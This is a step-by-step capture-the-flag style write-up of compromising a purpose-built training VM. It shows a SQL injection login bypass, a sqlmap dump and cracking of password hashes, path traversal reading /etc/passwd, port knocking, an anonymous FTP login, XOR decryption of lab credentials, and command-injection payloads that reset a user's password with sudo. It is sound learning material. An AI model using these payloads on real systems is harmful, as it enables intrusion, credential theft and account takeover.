---
title: Pootato VM Writeup
date: 2025-02-21
excerpt: My first ever pwn of a box
category: writeups
tags:
   - writeups
---

# Pootato Virtual Machine (VM)

Huge Thanks & Credits to my senior at [Custodio Technologies](https://www.custodiotech.com.sg/) who created the VM ([hongecc](https://github.com/hongecc))

VM file link: https://drive.google.com/file/d/19pDwTe_qEJr2y3Jow0lt3HVToY7rqcbM/view?usp=sharing

_Note: This is my first time, bare with me please._

I will be using [Kali Linux](https://www.kali.org/) on [VMware Workstation Pro](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion) as my Virtualization Software.


## Setting Up
Ensuring that my [Kali Linux](https://www.kali.org/) (Attacking Machine) & the Pootato VM (Target Machine) are on the same network.

## Fun Time!
Powering on Pootato VM shows us that it is using Debian, and two user accounts are available for usage, ***cabbage*** & ***potato-helpdesk***.

![Debian_Login_Page](@images/2025/pootato-vm-writeup/Debian_Login_Page.png)

***Cyber Kill Chain = Reconnaissance --> Weaponization --> Delivery --> Exploitation --> Installation --> Command & Control (C2) --> Actions on Objectives***

While I won't be implementing all the steps in the Cyber Kill Chain, I will be following the general flow which first leads us to **RECONNAISSANCE**.

**Goal: Finding all open ports (Attack Vectors), gathering as much information as possible.**

## Reconnaissance

1) I will start by using [Metasploit Framework](https://github.com/rapid7/metasploit-framework) so that I can automatically have the output of my [NMAP](https://github.com/nmap/nmap) scans saved into the database.

2) Creating my Pootato Workspace in [Metasploit Framework](https://github.com/rapid7/metasploit-framework) `workspace add Pootato`.
3) Navigating to my Pootato Workspace in [Metasploit Framework](https://github.com/rapid7/metasploit-framework) `workspace Pootato`.
4) Identifying the IP address of the Pootato VM by scanning the network `ip a` followed by `nmap 192.168.233.0/24`, which gave the following result:

   ```
   Nmap scan report for potatos.potato-school.com (192.168.233.135)
   Host is up (0.0011s latency).
   Not shown: 998 filtered tcp ports (no-response)
   PORT    STATE SERVICE
   80/tcp  open  http
   443/tcp open  https
   ```
   
5) Further reconnaissance with [NMAP](https://github.com/nmap/nmap)'s aggressive scan (-A) & [Vulscan](https://github.com/scipag/vulscan)'s NSE script in [Metasploit Framework](https://github.com/rapid7/metasploit-framework) `db_nmap -A --script=vulscan 192.168.233.135`, which gave the following result when accessing it in the database `services`:

   ```
   Services
   ========

   host             port  proto  name      state  info
   ----             ----  -----  ----      -----  ----
   192.168.233.135  80    tcp    http      open   Apache httpd 2.4.62
   192.168.233.135  443   tcp    ssl/http  open   Apache httpd 2.4.62 (Debian)
   ```

   The raw output from the aggressive [NMAP](https://github.com/nmap/nmap) scan shows that a `/robots.txt` file & `/briefingnotes.txt` file exist:

   ```
   Nmap scan report for potatos.potato-school.com (192.168.233.135)
   Host is up (0.0018s latency).
   Not shown: 998 filtered tcp ports (no-response)
   PORT    STATE SERVICE  VERSION
   80/tcp  open  http     Apache httpd 2.4.62
   |_http-server-header: Apache/2.4.62 (Debian)
   |_http-title: Apache2 Debian Default Page: It works
   | http-robots.txt: 1 disallowed entry 
   |_/briefingnotes.txt
   443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
   | http-robots.txt: 1 disallowed entry 
   |_/briefingnotes.txt
   | ssl-cert: Subject: commonName=potatos.potato-school.com
   | Not valid before: 2024-11-05T05:41:58
   |_Not valid after:  2034-11-03T05:41:58
   |_http-server-header: Apache/2.4.62 (Debian)
   ```

6) Checking the output of the scan shows that there aren't any vulnerabilities:

   ```
   [*] Nmap: PORT    STATE SERVICE  REASON         VERSION
   [*] Nmap: 80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.62
   [*] Nmap: |_http-server-header: Apache/2.4.62 (Debian)
   [*] Nmap: | /usr/share/nmap/scripts/vulscan: VulDB - https://vuldb.com:
   [*] Nmap: | No findings
   [*] Nmap: | MITRE CVE - https://cve.mitre.org:
   [*] Nmap: | No findings
   [*] Nmap: | SecurityFocus - https://www.securityfocus.com/bid/:
   [*] Nmap: | No findings
   [*] Nmap: | IBM X-Force - https://exchange.xforce.ibmcloud.com:
   [*] Nmap: | No findings
   [*] Nmap: | Exploit-DB - https://www.exploit-db.com:
   [*] Nmap: | No findings
   [*] Nmap: | OpenVAS (Nessus) - http://www.openvas.org:
   [*] Nmap: | No findings
   [*] Nmap: | SecurityTracker - https://www.securitytracker.com:
   [*] Nmap: | No findings
   [*] Nmap: | OSVDB - http://www.osvdb.org:
   [*] Nmap: | No findings
   [*] Nmap: 443/tcp open  ssl/http syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
   [*] Nmap: |_http-server-header: Apache/2.4.62 (Debian)
   [*] Nmap: | /usr/share/nmap/scripts/vulscan: VulDB - https://vuldb.com:
   [*] Nmap: | No findings
   [*] Nmap: | MITRE CVE - https://cve.mitre.org:
   [*] Nmap: | No findings
   [*] Nmap: | SecurityFocus - https://www.securityfocus.com/bid/:
   [*] Nmap: | No findings
   [*] Nmap: | IBM X-Force - https://exchange.xforce.ibmcloud.com:
   [*] Nmap: | No findings
   [*] Nmap: | Exploit-DB - https://www.exploit-db.com:
   [*] Nmap: | No findings
   [*] Nmap: | OpenVAS (Nessus) - http://www.openvas.org:
   [*] Nmap: | No findings
   [*] Nmap: | SecurityTracker - https://www.securitytracker.com:
   [*] Nmap: | No findings
   [*] Nmap: | OSVDB - http://www.osvdb.org:
   [*] Nmap: | No findings
   ```

7) Since there aren't any vulnerabilities in the output of the scan, I decided to use a web browser ([Mozilla](https://github.com/mozilla)) & access the website of the Pootato VM since we saw that both HTTP & HTTPS ports were open alongside the word "Apache", by typing the IP address of the Pohhtato VM in the URL bar `192.168.233.135`:

   ![HTTP_192.168.233.135_Access](@images/2025/pootato-vm-writeup/HTTP_192.168.233.135_Access.png)

8) Access the website using HTTP doesn't seem to work & it gives the word "Forbidden", which is HTTP response code 403. Since I am unable to access the webpage via HTTP, I decided to add HTTPS:// at the front of the IP address when typing it into the URL bar `https://192.168.233.135`:

   ![HTTPS_192.168.233.135_Invalid_Security_Certificate](@images/2025/pootato-vm-writeup/HTTPS_192.168.233.135_Invalid_Security_Certificate.png)

9) Seeing the Invalid Security Certificate popup reminded me of a task in [TryHackMe Advent of Cyber 2024](https://tryhackme.com/christmas/) regarding Certificate Mismanagement. Further exploration showed that the Common Name & Issuer of the certificate was ***potatos.potato-school.com***. When attempting to access the website ***potatos.potato-school.com***, it failed because the system isn't resolving ***potatos.potato-school.com*** to ***192.168.233.135***. In order to change that, I used the following commands: `sudo su` &`echo "192.168.233.135 potatos.potato-school.com >> /etc/hosts"`, which then allowed me to access the website.

   ![Invalid_Security_Certificate_Detail](@images/2025/pootato-vm-writeup/Invalid_Security_Certificate_Detail.png)
   ![Server_Not_Found](@images/2025/pootato-vm-writeup/Server_Not_Found.png)
   ![HTTPS_potatos.potato-school.com_ACCESS](@images/2025/pootato-vm-writeup/HTTPS_potatos.potato-school.com_ACCESS.png)

   Previously, I found the `/robots.txt` file & `/briefingnotes.txt` file, which I attempted to access to see what information is there:

   `/robots.txt`:
   ```
   User-agent: *
   Disallow: /briefingnotes.txt
   ```
   `/briefingnotes.txt`:
   ```
   do remember to inform staff of the following:
   attached encrypted file contains shared staff account credentials.
   the file is encrypted in XOR format
   the password of the file will be the date of the School's Anniversary in DD/MM/YYYY format
   ```

   I will keep the information stated in the `/briefingnotes.txt` file in the back of my mind for now.
   
10) Since the webpage seems to be normal & we knew that only 2 ports were open, I decided to try Directory Brute-forcing using the application [Dirbuster](https://www.kali.org/tools/dirbuster/). First, I filled in the type `https://potatos.potato-school.com` in the _Target URL_ field, ticked the checkbox _Go Faster_, used the wordlist _/usr/share/wordlists/Discovery/Web-Content/common.txt_, and pressed `Start`.

    ![Dirbuster Application Interface](@images/2025/pootato-vm-writeup/Dirbuster_Application_Interface.png)
   
11) Upon completion of the brute-force, we received the following results when navigating to the `Results - List View: Dirs: XX Files: XX`, we can see the followwing directories & files that gave a HTTP response code of 200: The root directory `/` & the file `/login.php`.

    ![Dirbuster_Application_Scan_Result](@images/2025/pootato-vm-writeup/Dirbuster_Application_Scan_Result.png)

12) Since we can see that `/login.php` gave a HTTP response code of 200, I decided to access the page which showed a simple `Student Login` page. Since the webpage showed a simple login page, I decided to use a simple attack method: [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), and inserted `' OR 1 = 1 #` into the `Name` field & a random character in the `Password` field.

    ![HTTPS_potatos.potato-school.com_login.php](@images/2025/pootato-vm-writeup/HTTPS_potatos.potato-school.com_login.php.png)

## SQL Injection & Mapping

13) Successful [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) into `Student Login` webpage:
   
    ![HTTPS_potatos.potato-school.com_Student_Login_SQL_Injection_Success](@images/2025/pootato-vm-writeup/HTTPS_potatos.potato-school.com_Student_Login_SQL_Injection_Success.png)

14) With the successful [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), we can see that we are logged in as `Malcolm`, with his personal data such as his class `CY2304U` & email `malcolm@potato-school.com`. Also, we can see various learning resources but are unable to access them (We will keep them in mind for now):

    - `Chapter 1: SQL Map`
    - `Chapter 2: Local File Inclusion`
    - `Chapter 3: Command Injection`
    - `Chapter 4: Privilege Escalation`
    - `Chapter 5: Port Knocking`

    Lastly, we can see a hyperlink in the webpage `Roundcube Webmail`, which opens a web mail application.

    ![Roundcube_Webmail_Login_Page](@images/2025/pootato-vm-writeup/Roundcube_Webmail_Login_Page.png)

    Since I managed to access `Malcolm`'s account, but am unable to access any accounts with invalid credentials, I assumed that there could be a database in the backend.

14) Using [SQLMap](https://github.com/sqlmapproject/sqlmap) to enumerate data from the database with the following command: `sqlmap -u https://potatos.potato-school.com/login.php --dbs --forms -a`, I received the following output:

    ```
    Database: school_db
    Table: students
    [12 entries]
    +----+---------+----------------------------+----------+--------+----------------------------------+
    | id | class   | email                      | name     | gender | password                         |
    +----+---------+----------------------------+----------+--------+----------------------------------+
    | 1  | CY2304U | malcolm@potato-school.com  | malcolm  | Male   | 98c5fb0477da411c710a07921cade8cb |
    | 2  | CY2304U | jaeger@potato-school.com   | jaeger   | Male   | af0f0a77d092493ad15cf8e5e3bca6ea |
    | 3  | CY2304U | weile@potato-school.com    | weile    | Male   | 1828e186a1dfb3d9b49e2360674e901c |
    | 4  | CY2304Q | jasmine@potato-school.com  | jasmine  | Female | 1a684e4feecf6e4812ea41f700589b5e |
    | 5  | CY2304Q | charlene@potato-school.com | charlene | Female | 2b7f195f888bff306af886101c98ce4f |
    | 6  | CY2304Q | jasper@potato-school.com   | jasper   | Male   | 7810aaa2b13020b68194d3eca71c4d27 |
    | 7  | CY2304Q | charles@potato-school.com  | charles  | Male   | 365cd1542cf1591f4cad5b0fe7554980 |
    | 8  | CY2304U | chaewon@potato-school.com  | chaewon  | Female | 09f458fd0b089b1da459423ec11b4ee5 |
    | 9  | CY2304U | sakura@potato-school.com   | sakura   | Female | 762ac3593f04d665967a696498d15690 |
    | 10 | CY2304Q | kazuha@potato-school.com   | kazuha   | Female | 81f6f341a102b63c21c14beb2c0ed390 |
    | 11 | CY2304U | yunjin@potato-school.com   | yunjin   | Female | 6a4d05961a833bd3f9d4250e333464c4 |
    | 12 | CY2304Q | eunchae@potato-school.com  | eunchae  | Female | db7bb5980eb66c7ad8bd795adcfa5055 |
    +----+---------+----------------------------+----------+--------+----------------------------------+
    ```

    In the password column, we can see a string of random characters which seems to be hashes. Using [Crackstation](https://crackstation.net), we recieved the output of the cracked hash for eunchae which is _manchae_.

    ![Eunchae_Crackstation_Cracked_Hash](@images/2025/pootato-vm-writeup/Eunchae_Crackstation_Cracked_Hash.png)

    Now that I have the password of Eunchae's account, I attempted to login into RoundCube Webmail with Eunchae credentials.

15) Logging into Eunchae's account, the following 2 emails stood out the most, one stating the URL of the new dashboard (website) & the other stating that class would be cancelled due to the school's 18th anniversary.

    ![Roundcube_Webmail_New_Dashboard_Email](@images/2025/pootato-vm-writeup/Roundcube_Webmail_New_Dashboard_Email.png)
    ![Roundcube_Webmail_Class_Cancellation_Email](@images/2025/pootato-vm-writeup/Roundcube_Webmail_Class_Cancellation_Email.png)

    If we recall previously, it was stated in the `/briefingnotes.txt` that the password for a file is the school's anniversary date in DD/MM/YYYY format. With the email, we can deduce that the school's anniversary date is _12/11/2006_.

16) Opening the link stated in Eunchae's inbox `https://potatos.potato-school.com/new_dashboard/login.php` brings us to login page. As the email stated, all user accounts (students, most likely) had their password reset to `P@$$w0rd`, attempting to login with `Eunchae` as the username & `P@$$w0rd` was successful and allowed us to navigate through the new dashboard, upon changing the password, which I changed to `manchae`.

    ![New_Dashboard_Login.php](@images/2025/pootato-vm-writeup/New_Dashboard_Login.php.png)
    ![New_Dashboard_Login.pup_Eunchae_Success](@images/2025/pootato-vm-writeup/New_Dashboard_Login.pup_Eunchae_Success.png)

    Exploring the various sections, tabs, and buttons in the new dashboard, the one that stood out the most was `Retrieve User Data`. Clicking on `Retrieve User Data` showed that the URL changed to `https://potatos.potato-school.com/new_dashboard/index.php?data_path=%2Feunchae%2Feunchae_data`. In the URL, the path as to which the data is obtained from was stated, which brought to my mind the attack known as [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).

## Path Traversal

17) Attempting [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal), I decided to look at various files:

    `/etc/hosts`
    ```
    127.0.0.1 localhost
    127.0.1.1 potatos.potato-school.com www.potato-school.com
    # The following lines are desirable for IPv6 capable hosts
    ::1 localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ```
    
    `/etc/passwd`
    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
    mysql:x:100:108:MySQL Server,,,:/var/lib/mysql:/bin/false
    messagebus:x:101:109::/nonexistent:/usr/sbin/nologin
    sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
    tss:x:103:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    usbmux:x:104:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    avahi:x:106:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
    speech-dispatcher:x:107:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
    fwupd-refresh:x:108:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    saned:x:109:118::/var/lib/saned:/usr/sbin/nologin
    geoclue:x:110:119::/var/lib/geoclue:/usr/sbin/nologin
    polkitd:x:997:997:polkit:/nonexistent:/usr/sbin/nologin
    rtkit:x:111:120:RealtimeKit,,,:/proc:/usr/sbin/nologin
    colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
    gnome-initial-setup:x:113:65534::/run/gnome-initial-setup/:/bin/false
    Debian-gdm:x:114:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
    bind:x:115:123::/var/cache/bind:/usr/sbin/nologin
    postfix:x:116:124::/var/spool/postfix:/usr/sbin/nologin
    dovecot:x:117:126:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
    dovenull:x:118:127:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
    malcolm:x:1004:1004::/home/malcolm:/bin/restrictedbash
    jaeger:x:1005:1005::/home/jaeger:/bin/restrictedbash
    weile:x:1006:1006::/home/weile:/bin/restrictedbash
    jasmine:x:1007:1007::/home/jasmine:/bin/restrictedbash
    charlene:x:1008:1008::/home/charlene:/bin/restrictedbash
    jasper:x:1009:1009::/home/jasper:/bin/restrictedbash
    charles:x:1010:1010::/home/charles:/bin/restrictedbash
    chaewon:x:1013:1013::/home/chaewon:/bin/restrictedbash
    sakura:x:1014:1014::/home/sakura:/bin/restrictedbash
    kazuha:x:1015:1015::/home/kazuha:/bin/restrictedbash
    eunchae:x:1016:1016::/home/eunchae:/bin/restrictedbash
    yunjin:x:1019:1019::/home/yunjin:/bin/restrictedbash
    ftp:x:119:128:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
    cabbage:x:1020:1020::/home/cabbage:/bin/sh
    potato-helpdesk:x:1021:1021::/home/potato-helpdesk:/bin/sh
    ```

    `/etc/shadow` showed nothing

## Port Knocking

18) Attempting other methods/angles of attacks didn't yield much results, thus I decided to go back to refer back to the courses that were released on the dashboard. SQLMap attack, Local File Inclusion attack, Command Injection, and Privilege Escalation attack didn't seem to work which made me try the Port Knocking angle. Searching online, the file required for Port Knocking to work is `knockd.conf`. Accessing `/etc/knockd.conf` gave the following output:

    ```
    [options]
    UseSyslog

    [openFTP]
    sequence = 1000,2000
    seq_timeout = 5
    command = /usr/sbin/ufw allow 21/tcp
    tcpflags = syn

    [closeFTP]
    sequence = 3000
    seq_timeout = 5
    command = /usr/sbin/ufw deny 21/tcp
    tcpflags = syn
    ```

    This meant that in order to open port 21 (FTP), I have to send TCP SYN packets to port 1000 followed by port 2000 within 5 seconds, which can be achieved by using a [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) tool. My preferred [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) tool of choice is [KnockIt](https://github.com/eliemoutran/KnockIt). Using the command `knockit 192.168.233.135 1000 2000` to conduct [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) & doing a [NMAP](https://github.com/nmap/nmap) right after gives the following output:

    ```
    Nmap scan report for potatos.potato-school.com (192.168.233.137)
    Host is up (0.00076s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE SERVICE
    21/tcp  open  ftp
    80/tcp  open  http
    443/tcp open  https
    ```

    As port 21 (ftp) is open, the [Port Knocking](https://wiki.archlinux.org/title/Port_knocking) was a success.

19) Since the ftp port is open, I decided to try to access the Pootato VM via the ftp port. Howevever, attempts to login via ftp with the student credentials obtained from the output of [SQLMap](https://github.com/sqlmapproject/sqlmap) was unsuccessful, I decided to find other ways to login via ftp. Searching online, I found out that it might be possible to log into the ftp server as an `anonymous` user, which I attempted to do so & gained access.

    ```
    ┌──(ctf)─(kali㉿kali)-[~]
    └─$ ftp 192.168.233.137
    Connected to 192.168.233.137.
    220 (vsFTPd 3.0.3)
    Name (192.168.233.137:kali): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> 
    ```

    Upon gaining access, as I know that there are 2 types of ftp connection modes, I decided to go with the passive mode & explore the files in the ftp server. Using the `ls` command, I can see that the `Drafts` directory is available. Accessing the `Drafts` directory & using the `ls` command, it showed that the following files were present in the `Drafts` directory: `Encrypted_Attachment.dat` & `staff_email_draft.txt`. Using the `get` command, I downloaded the files into my [Kali Linux](https://www.kali.org/) machine.

    ```
    ftp> passive
    Passive mode: off; fallback to active mode: off.
    ftp> cd Drafts
    250 Directory successfully changed.
    ftp> ls
    200 EPRT command successful. Consider using EPSV.
    150 Here comes the directory listing.
    -r-xr-xr-x    1 119      128            58 Nov 05 17:20 Encrypted_Attachment.dat
    -r-xr-xr-x    1 119      128           759 Nov 05 09:18 staff_email_draft.txt
    226 Directory send OK.
    ftp> get Encrypted_Attachment.dat
    local: Encrypted_Attachment.dat remote: Encrypted_Attachment.dat
    200 EPRT command successful. Consider using EPSV.
    150 Opening BINARY mode data connection for Encrypted_Attachment.dat (58 bytes).
    100% |**********************************************************|    58        2.78 KiB/s    00:00 ETA
    226 Transfer complete.
    58 bytes received in 00:00 (2.60 KiB/s)
    ftp> get staff_email_draft.txt
    local: staff_email_draft.txt remote: staff_email_draft.txt
    200 EPRT command successful. Consider using EPSV.
    150 Opening BINARY mode data connection for staff_email_draft.txt (759 bytes).
    100% |**********************************************************|   759      336.91 KiB/s    00:00 ETA
    226 Transfer complete.
    759 bytes received in 00:00 (213.48 KiB/s)
    ftp>
    ```

20) Now that the files `Encrypted_Attachment.dat` & `staff_email_draft.txt` have been downloaded into my [Kali Linux](https://www.kali.org/) machine, I decided to first view the contents of `staff_email_draft.txt`:

    ```                                                                                                        
    ──(ctf)─(kali㉿kali)-[~]
    └─$ cat staff_email_draft.txt 
    Subject: Implementation of New User Dashboard and Shared Staff Account

    Dear Staff,

    I hope this message finds you well.

    I am writing to inform you about the implementation of a shared staff account that will be introduced to facilitate collaboration and streamline access to         essential resources within our school. This shared staff account will be launched together with the new user dashboard.

    We believe this shared account will enhance our ability to work together more effectively and improve our overall productivity. This shared account                credentials will be announced during a briefing later on after the School's Anniversary.

    If you have any questions or need further clarification, please do not hesitate to reach out.

    Best regards,
    Potato School
    ```

    Reviewing the contents of `staff_email_draft.txt`, it is stated that there would be an implementation of a shared staff account that will be launched together with the new user dashboard. In the output of `https://potatos.potato-school.com/briefingnotes.txt`, it was stated:

    ```
    do remember to inform staff of the following:
    attached encrypted file contains shared staff account credentials.
    the file is encrypted in XOR format
    the password of the file will be the date of the School's Anniversary in DD/MM/YYYY format
    ```

    This meant that the file `Encrypted_Attachment.dat` is encrypted in XOR format, and that the password to decrypt the file is _12/11/2006_ which was deduced from the email in Roundcube Webmail. Using [CyberChef](https://gchq.github.io/CyberChef) & selecting the XOR _recipe_ with _12/11/2006_ as the key, the output given was:

    ```
    Username : Shared_Account
    Password : p0tat0-sch00l-d4-b3st
    ```

    ![CyberChef_Output](@images/2025/pootato-vm-writeup/CyberChef_Output.png)

## Command Injection

21) With the Username `Shared_Account` & Password `p0tat0-sch00l-d4-b3st`, I decided to head back to the New Dashboard `https://potatos.potato-school.com/new_dashboard/login.php` & login with those credentials & was successful.

    ![Staff_Account_Login_New_Dashboard](@images/2025/pootato-vm-writeup/Staff_Account_Login_New_Dashboard.png)

    Upon successful login, I did some exploration & found that when clicking the button `Search` in the `Home` tab after typing some random letters such as the letter "a", the URL showed the following:

    `https://potatos.potato-school.com/new_dashboard/staff_dashboard.php?query=a`

    Additionally, the output also showed files that had the letter "a" included inside. The file `/home/potato-helpdesk/reset_password.sh` was the most stood out the most.

    ![Staff_Dashboard_Search_Field](@images/2025/pootato-vm-writeup/Staff_Dashboard_Search_Field.png)

    After many attempts to read the file with various commands like `cat /potato-helpdesk/reset_password.sh`, I decided to search online found a github repo [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands) that showed the different methods of Command Injection, allowing me to successfully read the file by adding a semi-colon in front of the command: `;cat /home/potato-helpdesk/reset_password.sh`, giving the following output:

    ```
    #!/bin/bash

    # Function to display usage
    usage() {
       echo "Usage: $0 -u <username>"
       echo "Example: $0 -u student1"
       exit 1
    }

    # Check if no arguments are provided
    if [ $# -eq 0 ]; then
       usage
    fi

    # Parse command line arguments
    while getopts ":u:" opt; do
       case ${opt} in
        u )
            user=$OPTARG
            ;;
        \? )
            usage
            ;;
       esac
    done

    # Check if user is specified
    if [ -z "$user" ]; then
       usage
    fi

    # Check if the user exists on the system
    if id "$user" &>/dev/null; then
       # Reset password for the specified user
       echo "Resetting password for user: $user"
       echo "$user:password" | chpasswd
    
       # Check if the password reset was successful
       if [ $? -eq 0 ]; then
          echo "Password for user '$user' has been reset successfully."
       else
          echo "Failed to reset password for user '$user'."
          exit 1
       fi
    else
       echo "User '$user' does not exist."
       exit 1
    fi
    ```

    Reading the code for `/home/potato-helpdesk/reset_password.sh` tells us that the if the user exists, it will reset the password for the user with `password` in the following code block:

    ```
    # Check if the user exists on the system
    if id "$user" &>/dev/null; then
       # Reset password for the specified user
       echo "Resetting password for user: $user"
       echo "$user:password" | chpasswd
    ```

    Additionally, the code also tells us how to use it in the start of the script, indicating that usage function (shebang) with the intepreter to use:

    ```
    #!/bin/bash

    # Function to display usage
    usage() {
       echo "Usage: $0 -u <username>"
       echo "Example: $0 -u student1"
       exit 1
    }
    ```

22) With all the information at hand, I attempted to change the password of the cabbage user with the command `;bash /home/potato-helpdesk/reset_password.sh -u cabbage` but received the output:

    ```
    Resetting password for user: cabbage
    Changing password for cabbage.
    Failed to reset password for user 'cabbage'.
    ```

    Assuming that it was a permissions issue, I decided to add the `sudo` command in front of the initial command & received the following output:

    ```
    Resetting password for user: cabbage
    Password for user 'cabbage' has been reset successfully.
    ```

23) Since I know that the password will be changed to `password` upon reset, I attempted to log into Cabbage's account in the Pootato VM with `password` & and was successful.

    ![Cabbage_Account_Successful_Login](@images/2025/pootato-vm-writeup/Cabbage_Account_Successful_Login.png)

# The End
